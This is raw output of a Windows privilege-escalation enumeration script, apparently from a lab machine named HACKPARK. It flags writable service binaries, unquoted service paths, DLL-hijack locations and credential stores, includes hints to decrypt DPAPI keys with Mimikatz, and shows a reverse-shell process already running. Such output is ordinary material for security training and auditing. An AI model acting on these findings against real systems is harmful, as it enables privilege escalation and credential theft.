You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\Wanarp                                       
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\Wanarpv6                                     
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\WAS                                          
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\Wcmsvc                                       
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\WcsPlugInService                             
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\Wdf01000                                     
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\Wecsvc                                       
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\WEPHOSTSVC                                   
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\wercplsupport                                
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\WerSvc                                       
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\WFPLWFS                                      
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\WIMMount                                     
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\WindowsScheduler                             
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\WinHttpAutoProxySvc                          
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\WinMad                                       
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\Winmgmt                                      
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\WinNat                                       
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\WinRM                                        
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\Winsock                                      
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\WinSock2                                     
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\WinVerbs                                     
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\WmiAcpi                                      
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\WmiApRpl                                     
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\wmiApSrv                                     
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\workerdd                                     
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\WPDBusEnum                                   
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\ws2ifsl                                      
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\WSService                                    
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\wtlmdrv                                      
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\wuauserv                                     
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\WudfPf                                       
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\wudfsvc                                      
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\XEN                                          
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\xenbus                                       
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\xenbus_monitor                               
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\xenfilt                                      
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\xeniface                                     
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\xennet                                       
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\xenvbd                                       
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\xenvif                                       
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\xmlprov                                      
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\{35E1B823-1443-4A40-875E-3A1C41494DB7}       
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\{51E2531C-2946-4F58-A4BB-072994EB3731}       
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\{C7568B63-C424-48B3-AB9B-6D1F004D5AFC}       
                                                                                                                 
 [+] UNQUOTED SERVICE PATHS                                                                                      
   [i] When the path is not quoted (ex: C:\Program files\soft\new folder\exec.exe) Windows will try to execute first 'C:\Program.exe', then 'C:\Program Files\soft\new.exe' and finally 'C:\Program Files\soft\new folder\exec.exe'. Try to create 'C:\Program Files\soft\new.exe'                                                                 
   [i] The permissions are also checked and filtered using icacls                                                
   [?] https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#services                 
aspnet_state                                                                                                     
 C:\Windows\Microsoft.NET\Framework64\v4.0.30319\aspnet_state.exe                                                
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\aspnet_state.exe NT SERVICE\TrustedInstaller:(F)                 
                                                                                                                 
AWSLiteAgent                                                                                                     
 C:\Program Files\Amazon\XenTools\LiteAgent.exe                                                                  
Invalid parameter "Files\Amazon\XenTools\LiteAgent.exe"                                                          
NetTcpPortSharing                                                                                                
 C:\Windows\Microsoft.NET\Framework64\v4.0.30319\SMSvcHost.exe                                                   
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\SMSvcHost.exe NT SERVICE\TrustedInstaller:(F)                    
                                                                                                                 
PerfHost                                                                                                         
 C:\Windows\SysWow64\perfhost.exe                                                                                
C:\Windows\SysWow64\perfhost.exe NT SERVICE\TrustedInstaller:(F)                                                 
                                                                                                                 
PsShutdownSvc                                                                                                    
 C:\Windows\PSSDNSVC.EXE                                                                                         
C:\Windows\PSSDNSVC.EXE NT AUTHORITY\SYSTEM:(I)(F)                                                               
                        BUILTIN\Administrators:(I)(F)                                                            
                                                                                                                 
TrustedInstaller                                                                                                 
 C:\Windows\servicing\TrustedInstaller.exe                                                                       
C:\Windows\servicing\TrustedInstaller.exe NT SERVICE\TrustedInstaller:(F)                                        
                                                                                                                 
WindowsScheduler                                                                                                 
 C:\PROGRA~2\SYSTEM~1\WService.exe                                                                               
C:\PROGRA~2\SYSTEM~1\WService.exe Everyone:(I)(M)                                                                
                                  BUILTIN\Administrators:(I)(F)                                                  
                                                                                                                 
                                                                                                                 
[*] DLL HIJACKING in PATHenv variable                                                                            
   [i] Maybe you can take advantage of modifying/creating some binary in some of the following locations         
   [i] PATH variable entries permissions - place binary or DLL to execute instead of legitimate                  
   [?] https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#dll-hijacking            
C:\Windows\system32 NT SERVICE\TrustedInstaller:(F)                                                              
                    BUILTIN\Administrators:(M)                                                                   
                    BUILTIN\Administrators:(OI)(CI)(IO)(F)                                                       
                                                                                                                 
C:\Windows NT SERVICE\TrustedInstaller:(F)                                                                       
           BUILTIN\Administrators:(M)                                                                            
           BUILTIN\Administrators:(OI)(CI)(IO)(F)                                                                
                                                                                                                 
C:\Windows\System32\Wbem NT SERVICE\TrustedInstaller:(F)                                                         
                         BUILTIN\Administrators:(M)                                                              
                         BUILTIN\Administrators:(OI)(CI)(IO)(F)                                                  
                                                                                                                 
                                                                                                                 
[*] CREDENTIALS                                                                                                  
                                                                                                                 
 [+] WINDOWS VAULT                                                                                               
   [?] https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#windows-vault            
                                                                                                                 
Currently stored credentials:                                                                                    
                                                                                                                 
* NONE *                                                                                                         
                                                                                                                 
 [+] DPAPI MASTER KEYS                                                                                           
   [i] Use the Mimikatz 'dpapi::masterkey' module with appropriate arguments (/rpc) to decrypt                   
   [?] https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#dpapi                    
                                                                                                                 
                                                                                                                 
    Directory: C:\Users\Administrator\AppData\Roaming\Microsoft\Protect                                          
                                                                                                                 
                                                                                                                 
Mode                LastWriteTime     Length Name                                                                
----                -------------     ------ ----                                                                
d---s         9/27/2022  11:27 AM            S-1-5-21-141259258-288879770-38949                                  
                                             83326-500                                                           
                                                                                                                 
                                                                                                                 
 [+] DPAPI MASTER KEYS                                                                                           
   [i] Use the Mimikatz 'dpapi::cred' module with appropriate /masterkey to decrypt                              
   [i] You can also extract many DPAPI masterkeys from memory with the Mimikatz 'sekurlsa::dpapi' module         
   [?] https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#dpapi                    
                                                                                                                 
Looking inside C:\Users\Administrator\AppData\Roaming\Microsoft\Credentials\                                     
                                                                                                                 
The system cannot find the batch label specified - T_Progress                                                    
                                                                                                                 
Looking inside C:\Users\Administrator\AppData\Local\Microsoft\Credentials\                                       
                                                                                                                 
                                                                                                                 
 [+] Unattended files                                                                                            
                                                                                                                 
 [+] SAM and SYSTEM backups                                                                                      
                                                                                                                 
 [+] McAffee SiteList.xml                                                                                        
 Volume in drive C has no label.                                                                                 
 Volume Serial Number is 0E97-C552                                                                               
 Volume in drive C has no label.                                                                                 
 Volume Serial Number is 0E97-C552                                                                               
 Volume in drive C has no label.                                                                                 
 Volume Serial Number is 0E97-C552                                                                               
 Volume in drive C has no label.                                                                                 
 Volume Serial Number is 0E97-C552                                                                               
                                                                                                                 
 [+] GPP Password                                                                                                
                                                                                                                 
 [+] Cloud Credentials                                                                                           
                                                                                                                 
 [+] AppCmd                                                                                                      
   [?] https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#appcmd-exe               
C:\Windows\system32\inetsrv\appcmd.exe exists.                                                                   
                                                                                                                 
 [+] Files in registry that may contain credentials                                                              
   [i] Searching specific files that may contains credentials.                                                   
   [?] https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#credentials-inside-files 
Looking inside HKCU\Software\ORL\WinVNC3\Password                                                                
Looking inside HKEY_LOCAL_MACHINE\SOFTWARE\RealVNC\WinVNC4/password                                              
Looking inside HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\WinLogon                                        
    DefaultDomainName    REG_SZ                                                                                  
    DefaultUserName    REG_SZ                                                                                    
Looking inside HKLM\SYSTEM\CurrentControlSet\Services\SNMP                                                       
                                                                                                                 
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\SNMP\Parameters                                             
                                                                                                                 
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\SNMP\Parameters\ExtensionAgents                             
    W3SVC    REG_SZ    Software\Microsoft\W3SVC\CurrentVersion                                                   
                                                                                                                 
Looking inside HKCU\Software\TightVNC\Server                                                                     
Looking inside HKCU\Software\SimonTatham\PuTTY\Sessions                                                          
Looking inside HKCU\Software\OpenSSH\Agent\Keys                                                                  
C:\ProgramData\Amazon\EC2-Windows\Launch\Sysprep\Unattend.xml                                                    
C:\ProgramData\Amazon\EC2Launch\sysprep\unattend.xml                                                             
C:\Users\All Users\Amazon\EC2-Windows\Launch\Sysprep\Unattend.xml                                                
C:\Users\All Users\Amazon\EC2Launch\sysprep\unattend.xml                                                         
C:\Windows\Panther\setupinfo                                                                                     
C:\Windows\System32\inetsrv\appcmd.exe                                                                           
C:\Windows\SysWOW64\inetsrv\appcmd.exe                                                                           
C:\Windows\WinSxS\amd64_ipamprov-dhcp_31bf3856ad364e35_6.3.9600.16384_none_64e8a179c6f2a167\ScheduledTasks.xml   
C:\Windows\WinSxS\amd64_ipamprov-dns_31bf3856ad364e35_6.3.9600.16384_none_824aabe06aee1705\ScheduledTasks.xml    
C:\Windows\WinSxS\amd64_microsoft-windows-d..rvices-domain-files_31bf3856ad364e35_6.3.9600.16384_none_8bc96e4517571480\ntds.dit                                                                                                   
C:\Windows\WinSxS\amd64_microsoft-windows-iis-sharedlibraries_31bf3856ad364e35_6.3.9600.16384_none_01a7d2cf88c95dc0\appcmd.exe                                                                                                    
C:\Windows\WinSxS\amd64_microsoft-windows-iis-sharedlibraries_31bf3856ad364e35_6.3.9600.17031_none_01dac51388a3a832\appcmd.exe                                                                                                    
C:\Windows\WinSxS\amd64_microsoft-windows-webenroll.resources_31bf3856ad364e35_6.3.9600.16384_en-us_7427d216367d8d3f\certnew.cer                                                                                                  
C:\Windows\WinSxS\wow64_ipamprov-dhcp_31bf3856ad364e35_6.3.9600.16384_none_6f3d4bcbfb536362\ScheduledTasks.xml   
C:\Windows\WinSxS\wow64_ipamprov-dns_31bf3856ad364e35_6.3.9600.16384_none_8c9f56329f4ed900\ScheduledTasks.xml    
C:\Windows\WinSxS\wow64_microsoft-windows-iis-sharedlibraries_31bf3856ad364e35_6.3.9600.16384_none_0bfc7d21bd2a1fbb\appcmd.exe                                                                                                    
C:\Windows\WinSxS\wow64_microsoft-windows-iis-sharedlibraries_31bf3856ad364e35_6.3.9600.17031_none_0c2f6f65bd046a2d\appcmd.exe                                                                                                    
C:\inetpub\logs\LogFiles\W3SVC1\u_ex190803.log                                                                   
C:\inetpub\logs\LogFiles\W3SVC1\u_ex190804.log                                                                   
C:\inetpub\logs\LogFiles\W3SVC1\u_ex190805.log                                                                   
C:\inetpub\logs\LogFiles\W3SVC1\u_ex201002.log                                                                   
C:\inetpub\logs\LogFiles\W3SVC1\u_ex220927.log                                                                   
C:\inetpub\logs\LogFiles\W3SVC2\u_ex190803.log                                                                   
C:\inetpub\wwwroot\Web.config                                                                                    
C:\inetpub\wwwroot\Account\Web.Config                                                                            
C:\inetpub\wwwroot\admin\Web.Config                                                                              
C:\inetpub\wwwroot\admin\app\editor\Web.Config                                                                   
C:\inetpub\wwwroot\setup\Web.config                                                                              
                                                                                                                 
---                                                                                                              
Scan complete.                                                                                                   
   [i] You can inject 'fake' updates into non-SSL WSUS traffic (WSUXploit)                                       
   [?] https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#wsus                     
                                                                                                                 
 [+] RUNNING PROCESSES                                                                                           
   [i] Something unexpected is running? Check for vulnerabilities                                                
   [?] https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#running-processes        
                                                                                                                 
Image Name                     PID Services                                                                      
========================= ======== ============================================                                  
System Idle Process              0 N/A                                                                           
System                           4 N/A                                                                           
smss.exe                       372 N/A                                                                           
csrss.exe                      524 N/A                                                                           
csrss.exe                      580 N/A                                                                           
wininit.exe                    588 N/A                                                                           
winlogon.exe                   616 N/A                                                                           
services.exe                   676 N/A                                                                           
lsass.exe                      684 SamSs                                                                         
svchost.exe                    740 BrokerInfrastructure, DcomLaunch, LSM,                                        
                                   PlugPlay, Power, SystemEventsBroker                                           
svchost.exe                    784 RpcEptMapper, RpcSs                                                           
dwm.exe                        860 N/A                                                                           
svchost.exe                    872 Dhcp, EventLog, lmhosts, Wcmsvc                                               
svchost.exe                    900 CertPropSvc, DsmSvc, gpsvc, iphlpsvc,                                         
                                   LanmanServer, ProfSvc, Schedule, SENS,                                        
                                   SessionEnv, ShellHWDetection, Themes,                                         
                                   Winmgmt                                                                       
svchost.exe                    960 EventSystem, FontCache, netprofm, nsi,                                        
                                   W32Time, WinHttpAutoProxySvc                                                  
svchost.exe                   1016 CryptSvc, Dnscache, LanmanWorkstation,                                        
                                   NlaSvc, WinRM                                                                 
svchost.exe                    976 BFE, DPS, MpsSvc                                                              
spoolsv.exe                   1136 Spooler                                                                       
amazon-ssm-agent.exe          1164 AmazonSSMAgent                                                                
svchost.exe                   1244 AppHostSvc                                                                    
LiteAgent.exe                 1264 AWSLiteAgent                                                                  
svchost.exe                   1364 TrkWks, UALSVC, UmRdpService                                                  
svchost.exe                   1380 W3SVC, WAS                                                                    
WService.exe                  1412 WindowsScheduler                                                              
WScheduler.exe                1552 N/A                                                                           
Ec2Config.exe                 1656 Ec2Config                                                                     
WmiPrvSE.exe                  1748 N/A                                                                           
svchost.exe                   1296 TermService                                                                   
taskhostex.exe                2536 N/A                                                                           
explorer.exe                  2612 N/A                                                                           
ServerManager.exe             3064 N/A                                                                           
WScheduler.exe                2444 N/A                                                                           
msdtc.exe                     1032 MSDTC                                                                         
w3wp.exe                      2060 N/A                                                                           
cmd.exe                        484 N/A                                                                           
conhost.exe                   1104 N/A                                                                           
revshell.exe                  2548 N/A                                                                           
Message.exe                   2792 N/A                                                                           
cmd.exe                       2308 N/A                                                                           
conhost.exe                   2504 N/A                                                                           
net.exe                       1884 N/A                                                                           
net1.exe                      1096 N/A                                                                           
WmiPrvSE.exe                  1560 N/A                                                                           
Message.exe                   2028 N/A                                                                           
tasklist.exe                  2976 N/A                                                                           
                                                                                                                 
   [i] Checking file permissions of running processes (File backdooring - maybe the same files start automatically when Administrator logs in)                                                                                    
C:\Program Files\Amazon\SSM\amazon-ssm-agent.exe NT AUTHORITY\SYSTEM:(I)(F)                                      
                                                 BUILTIN\Administrators:(I)(F)                                   
                                                                                                                 
C:\Program Files\Amazon\XenTools\LiteAgent.exe NT AUTHORITY\SYSTEM:(I)(F)                                        
                                               BUILTIN\Administrators:(I)(F)                                     
                                                                                                                 
C:\PROGRA~2\SYSTEM~1\WService.exe Everyone:(I)(M)                                                                
                                  BUILTIN\Administrators:(I)(F)                                                  
                                                                                                                 
C:\PROGRA~2\SYSTEM~1\WScheduler.exe Everyone:(I)(M)                                                              
                                    BUILTIN\Administrators:(I)(F)                                                
                                                                                                                 
C:\Program Files\Amazon\Ec2ConfigService\Ec2Config.exe NT AUTHORITY\SYSTEM:(I)(F)                                
                                                       BUILTIN\Administrators:(I)(F)                             
                                                                                                                 
C:\Windows\Explorer.EXE NT SERVICE\TrustedInstaller:(F)                                                          
                                                                                                                 
C:\Program Files (x86)\SystemScheduler\WScheduler.exe Everyone:(I)(M)                                            
                                                      BUILTIN\Administrators:(I)(F)                              
                                                                                                                 
c:\Windows\Temp\revshell.exe NT AUTHORITY\SYSTEM:(I)(S,RD)                                                       
                             BUILTIN\Administrators:(I)(F)                                                       
                                                                                                                 
C:\PROGRA~2\SYSTEM~1\Message.exe Everyone:(I)(M)                                                                 
                                 BUILTIN\Administrators:(I)(F)                                                   
                                                                                                                 
C:\Windows\SysWOW64\cmd.exe NT SERVICE\TrustedInstaller:(F)                                                      
                                                                                                                 
C:\Windows\sysWOW64\wbem\wmiprvse.exe NT SERVICE\TrustedInstaller:(F)                                            
                                                                                                                 
C:\PROGRA~2\SYSTEM~1\Message.exe Everyone:(I)(M)                                                                 
                                 BUILTIN\Administrators:(I)(F)                                                   
                                                                                                                 
C:\Windows\SysWOW64\cmd.exe NT SERVICE\TrustedInstaller:(F)                                                      
                                                                                                                 
C:\Windows\SysWOW64\Wbem\WMIC.exe NT SERVICE\TrustedInstaller:(F)                                                
                                                                                                                 
C:\Windows\SysWOW64\find.exe NT SERVICE\TrustedInstaller:(F)                                                     
                                                                                                                 
C:\Windows\SysWOW64\find.exe NT SERVICE\TrustedInstaller:(F)                                                     
                                                                                                                 
C:\Windows\SysWOW64\find.exe NT SERVICE\TrustedInstaller:(F)                                                     
                                                                                                                 
                                                                                                                 
   [i] Checking directory permissions of running processes (DLL injection)                                       
C:\Program Files\Amazon\SSM\ NT SERVICE\TrustedInstaller:(I)(F)                                                  
                             BUILTIN\Administrators:(I)(F)                                                       
                             BUILTIN\Administrators:(I)(OI)(CI)(IO)(F)                                           
                                                                                                                 
C:\Program Files\Amazon\Xentools\ NT SERVICE\TrustedInstaller:(I)(F)                                             
                                  BUILTIN\Administrators:(I)(F)                                                  
                                  BUILTIN\Administrators:(I)(OI)(CI)(IO)(F)                                      
                                                                                                                 
C:\PROGRA~2\SYSTEM~1\ Everyone:(OI)(CI)(M)                                                                       
                      BUILTIN\Administrators:(I)(F)                                                              
                      BUILTIN\Administrators:(I)(OI)(CI)(IO)(F)                                                  
                                                                                                                 
C:\PROGRA~2\SYSTEM~1\ Everyone:(OI)(CI)(M)                                                                       
                      BUILTIN\Administrators:(I)(F)                                                              
                      BUILTIN\Administrators:(I)(OI)(CI)(IO)(F)                                                  
                                                                                                                 
C:\Program Files\Amazon\Ec2ConfigService\ NT SERVICE\TrustedInstaller:(I)(F)                                     
                                          BUILTIN\Administrators:(I)(F)                                          
                                          BUILTIN\Administrators:(I)(OI)(CI)(IO)(F)                              
                                                                                                                 
C:\Windows\ NT SERVICE\TrustedInstaller:(F)                                                                      
            BUILTIN\Administrators:(M)                                                                           
            BUILTIN\Administrators:(OI)(CI)(IO)(F)                                                               
                                                                                                                 
C:\Program Files (x86)\SystemScheduler\ Everyone:(OI)(CI)(M)                                                     
                                        BUILTIN\Administrators:(I)(F)                                            
                                        BUILTIN\Administrators:(I)(OI)(CI)(IO)(F)                                
                                                                                                                 
c:\Windows\Temp\ NT AUTHORITY\SYSTEM:(OI)(CI)(S,RD)                                                              
                 BUILTIN\Administrators:(F)                                                                      
                 BUILTIN\Administrators:(OI)(CI)(IO)(F)                                                          
                                                                                                                 
C:\PROGRA~2\SYSTEM~1\ Everyone:(OI)(CI)(M)                                                                       
                      BUILTIN\Administrators:(I)(F)                                                              
                      BUILTIN\Administrators:(I)(OI)(CI)(IO)(F)                                                  
                                                                                                                 
C:\Windows\SysWOW64\ NT SERVICE\TrustedInstaller:(F)                                                             
                     BUILTIN\Administrators:(M)                                                                  
                     BUILTIN\Administrators:(OI)(CI)(IO)(F)                                                      
                                                                                                                 
C:\Windows\SysWOW64\wbem\ NT SERVICE\TrustedInstaller:(F)                                                        
                          BUILTIN\Administrators:(M)                                                             
                          BUILTIN\Administrators:(OI)(CI)(IO)(F)                                                 
                                                                                                                 
C:\PROGRA~2\SYSTEM~1\ Everyone:(OI)(CI)(M)                                                                       
                      BUILTIN\Administrators:(I)(F)                                                              
                      BUILTIN\Administrators:(I)(OI)(CI)(IO)(F)                                                  
                                                                                                                 
C:\Windows\SysWOW64\ NT SERVICE\TrustedInstaller:(F)                                                             
                     BUILTIN\Administrators:(M)                                                                  
                     BUILTIN\Administrators:(OI)(CI)(IO)(F)                                                      
                                                                                                                 
C:\Windows\SysWOW64\wbem\ NT SERVICE\TrustedInstaller:(F)                                                        
                          BUILTIN\Administrators:(M)                                                             
                          BUILTIN\Administrators:(OI)(CI)(IO)(F)                                                 
                                                                                                                 
C:\Windows\SysWOW64\ NT SERVICE\TrustedInstaller:(F)                                                             
                     BUILTIN\Administrators:(M)                                                                  
                     BUILTIN\Administrators:(OI)(CI)(IO)(F)                                                      
                                                                                                                 
C:\Windows\SysWOW64\ NT SERVICE\TrustedInstaller:(F)                                                             
                     BUILTIN\Administrators:(M)                                                                  
                     BUILTIN\Administrators:(OI)(CI)(IO)(F)                                                      
                                                                                                                 
C:\Windows\SysWOW64\ NT SERVICE\TrustedInstaller:(F)                                                             
                     BUILTIN\Administrators:(M)                                                                  
                     BUILTIN\Administrators:(OI)(CI)(IO)(F)                                                      
                                                                                                                 
                                                                                                                 
 [+] RUN AT STARTUP                                                                                              
   [i] Check if you can modify any binary that is going to be executed by admin or if you can impersonate a not found binary                                                                                                      
   [?] https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#run-at-startup           
                                                                BUILTIN\Administrators:(I)(OI)(CI)(F)            
                                                                                                                 
C:\Documents and Settings\All Users\Start Menu\Programs\Startup\desktop.ini BUILTIN\Administrators:(F)           
                                                                            BUILTIN\Administrators:(I)(F)        
                                                                                     BUILTIN\Administrators:(I)(F)                                                                                                                
                                                                                                                 
C:\Documents and Settings\Administrator\Start Menu\Programs\Startup NT AUTHORITY\SYSTEM:(OI)(CI)(F)              
                                                                    BUILTIN\Administrators:(OI)(CI)(F)           
                                                                    HACKPARK\Administrator:(OI)(CI)(F)           
                                                                                                                 
C:\Documents and Settings\Administrator\Start Menu\Programs\Startup\desktop.ini NT AUTHORITY\SYSTEM:(F)          
                                                                                BUILTIN\Administrators:(F)       
                                                                                HACKPARK\Administrator:(F)       
C:\Documents and Settings\Administrator\Start Menu\Programs\Startup\setwallpaper.lnk NT AUTHORITY\SYSTEM:(F)     
                                                                                     BUILTIN\Administrators:(F)  
                                                                                     HACKPARK\Administrator:(F)  
                                                                                                                 
                                                             BUILTIN\Administrators:(I)(OI)(CI)(F)               
                                                                                                                 
C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\desktop.ini BUILTIN\Administrators:(F)              
                                                                         BUILTIN\Administrators:(I)(F)           
                                                                                  BUILTIN\Administrators:(I)(F)  
                                                                                                                 
C:\Users\Administrator\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup NT AUTHORITY\SYSTEM:(OI)(CI)(F)                                                                                                              
                                                                                     BUILTIN\Administrators:(OI)(CI)(F)                                                                                                           
                                                                                     HACKPARK\Administrator:(OI)(CI)(F)                                                                                                           
                                                                                                                 
C:\Users\Administrator\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\desktop.ini NT AUTHORITY\SYSTEM:(F)                                                                                                          
                                                                                                 BUILTIN\Administrators:(F)                                                                                                       
                                                                                                 HACKPARK\Administrator:(F)                                                                                                       
C:\Users\Administrator\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\setwallpaper.lnk NT AUTHORITY\SYSTEM:(F)                                                                                                     
                                                                                                      BUILTIN\Administrators:(F)                                                                                                  
                                                                                                      HACKPARK\Administrator:(F)                                                                                                  
                                                                                                                 
                                                                                                                 
Folder: \                                                                                                        
Ec2ConfigMonitorTask                     N/A                    Ready                                            
                                                                                                                 
Folder: \Microsoft                                                                                               
INFO: There are no scheduled tasks presently available at your access level.                                     
                                                                                                                 
Folder: \Microsoft\Windows                                                                                       
INFO: There are no scheduled tasks presently available at your access level.                                     
                                                                                                                 
Folder: \Microsoft\Windows\.NET Framework                                                                        
.NET Framework NGEN v4.0.30319           N/A                    Ready                                            
.NET Framework NGEN v4.0.30319 64        N/A                    Ready                                            
                                                                                                                 
Folder: \Microsoft\Windows\Active Directory Rights Management Services Client                                    
AD RMS Rights Policy Template Management N/A                    Ready                                            
                                                                                                                 
Folder: \Microsoft\Windows\AppID                                                                                 
SmartScreenSpecific                      N/A                    Ready                                            
                                                                                                                 
Folder: \Microsoft\Windows\Application Experience                                                                
AitAgent                                 N/A                    Ready                                            
ProgramDataUpdater                       N/A                    Ready                                            
                                                                                                                 
Folder: \Microsoft\Windows\ApplicationData                                                                       
CleanupTemporaryState                    N/A                    Ready                                            
                                                                                                                 
Folder: \Microsoft\Windows\AppxDeploymentClient                                                                  
                                                                                                                 
Folder: \Microsoft\Windows\Autochk                                                                               
Proxy                                    N/A                    Ready                                            
                                                                                                                 
Folder: \Microsoft\Windows\CertificateServicesClient                                                             
SystemTask                               N/A                    Ready                                            
UserTask                                 N/A                    Ready                                            
                                                                                                                 
Folder: \Microsoft\Windows\Chkdsk                                                                                
ProactiveScan                            N/A                    Ready                                            
                                                                                                                 
Folder: \Microsoft\Windows\Customer Experience Improvement Program                                               
Consolidator                             9/27/2022 11:00:00 PM  Ready                                            
KernelCeipTask                           N/A                    Ready                                            
UsbCeip                                  N/A                    Ready                                            
                                                                                                                 
Folder: \Microsoft\Windows\Customer Experience Improvement Program\Server                                        
ServerCeipAssistant                      9/28/2022 10:40:21 AM  Ready                                            
                                                                                                                 
Folder: \Microsoft\Windows\Data Integrity Scan                                                                   
Data Integrity Scan                      10/24/2022 6:16:05 AM  Ready                                            
Data Integrity Scan for Crash Recovery   N/A                    Ready                                            
                                                                                                                 
Folder: \Microsoft\Windows\Defrag                                                                                
ScheduledDefrag                          N/A                    Ready                                            
                                                                                                                 
Folder: \Microsoft\Windows\Device Setup                                                                          
Metadata Refresh                         N/A                    Ready                                            
                                                                                                                 
Folder: \Microsoft\Windows\IME                                                                                   
                                                                                                                 
Folder: \Microsoft\Windows\MemoryDiagnostic                                                                      
                                                                                                                 
Folder: \Microsoft\Windows\MUI                                                                                   
LPRemove                                 N/A                    Ready                                            
                                                                                                                 
Folder: \Microsoft\Windows\Multimedia                                                                            
                                                                                                                 
Folder: \Microsoft\Windows\NetCfg                                                                                
BindingWorkItemQueueHandler              N/A                    Ready                                            
                                                                                                                 
Folder: \Microsoft\Windows\NetTrace                                                                              
GatherNetworkInfo                        N/A                    Ready                                            
                                                                                                                 
Folder: \Microsoft\Windows\PI                                                                                    
Secure-Boot-Update                       N/A                    Ready                                            
Sqm-Tasks                                N/A                    Ready                                            
                                                                                                                 
Folder: \Microsoft\Windows\PLA                                                                                   
                                                                                                                 
Folder: \Microsoft\Windows\Plug and Play                                                                         
Device Install Group Policy              N/A                    Ready                                            
Device Install Reboot Required           N/A                    Ready                                            
Plug and Play Cleanup                    N/A                    Ready                                            
Sysprep Generalize Drivers               N/A                    Ready                                            
                                                                                                                 
Folder: \Microsoft\Windows\Power Efficiency Diagnostics                                                          
AnalyzeSystem                            N/A                    Ready                                            
                                                                                                                 
Folder: \Microsoft\Windows\RAC                                                                                   
                                                                                                                 
Folder: \Microsoft\Windows\Ras                                                                                   
MobilityManager                          N/A                    Ready                                            
                                                                                                                 
Folder: \Microsoft\Windows\Registry                                                                              
RegIdleBackup                            N/A                    Ready                                            
                                                                                                                 
Folder: \Microsoft\Windows\Server Manager                                                                        
CleanupOldPerfLogs                       N/A                    Ready                                            
ServerManager                            N/A                    Ready                                            
                                                                                                                 
Folder: \Microsoft\Windows\Servicing                                                                             
StartComponentCleanup                    N/A                    Ready                                            
                                                                                                                 
Folder: \Microsoft\Windows\Shell                                                                                 
CreateObjectTask                         N/A                    Ready                                            
                                                                                                                 
Folder: \Microsoft\Windows\Software Inventory Logging                                                            
                                                                                                                 
Folder: \Microsoft\Windows\SoftwareProtectionPlatform                                                            
SvcRestartTask                           10/4/2022 9:49:11 AM   Ready                                            
                                                                                                                 
Folder: \Microsoft\Windows\SpacePort                                                                             
SpaceAgentTask                           N/A                    Ready                                            
                                                                                                                 
Folder: \Microsoft\Windows\Storage Tiers Management                                                              
Storage Tiers Management Initialization  N/A                    Ready                                            
                                                                                                                 
Folder: \Microsoft\Windows\Task Manager                                                                          
Interactive                              N/A                    Ready                                            
                                                                                                                 
Folder: \Microsoft\Windows\TaskScheduler                                                                         
Maintenance Configurator                 9/28/2022 1:00:00 AM   Ready                                            
Manual Maintenance                       N/A                    Ready                                            
Regular Maintenance                      9/28/2022 3:50:16 AM   Ready                                            
                                                                                                                 
Folder: \Microsoft\Windows\TextServicesFramework                                                                 
MsCtfMonitor                             N/A                    Running                                          
                                                                                                                 
